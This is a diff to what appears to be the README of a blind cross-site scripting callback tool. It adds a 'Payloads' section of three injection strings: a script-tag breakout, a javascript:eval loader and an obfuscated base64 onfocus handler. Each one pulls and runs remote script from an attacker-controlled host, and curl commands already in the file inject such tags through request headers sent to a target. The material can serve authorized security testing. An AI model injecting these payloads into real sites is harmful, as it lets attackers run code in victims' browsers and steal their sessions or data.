@@ -185,6 +185,17 @@ curl -A "<script src='https://YOUR_XLESS_URL'></script>" https://target.com
 curl -H "Referer: <script src='https://YOUR_XLESS_URL'></script>" https://target.com
 ```
 
+### Payloads
+
+<!-- Basic -->
+```'"><script src="https://your-xless.netlify.app"></script>```
+
+<!-- Via eval (currentScript fallback kicks in) -->
+```javascript:eval('var a=document.createElement("script");a.src="https://your-xless.netlify.app";document.body.appendChild(a)')```
+
+<!-- Event handler -->
+```'" onfocus=eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veW91ci14bGVzcy5uZXRsaWZ5LmFwcCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKQ==')) autofocus=```
+
 ### OOB Callback Test
 ```bash
 # Simple callback test to verify your listener is working
